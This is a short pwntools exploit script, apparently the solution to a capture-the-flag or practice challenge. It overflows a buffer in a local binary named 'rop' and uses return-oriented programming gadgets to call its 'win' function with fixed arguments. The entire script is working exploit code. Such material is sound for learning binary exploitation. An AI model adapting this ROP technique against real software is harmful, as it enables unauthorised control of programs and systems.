#!/usr/bin/python3
from pwn import *
PATH = './rop'
ADDR = '127.0.0.1'
PORT = 9002
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe','script', '-q', 'gdb_sess', '-c']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
######################
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
payload = b'A'*32 + b'B'*8
payload += p64(ret)  # stack alignment
payload += p64(pop_rdi_ret)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi_ret)
payload += p64(0xcafebabe)
payload += p64(elf.symbols.win)
io.sendlineafter(b'Enter some text: ', payload)
io.interactive()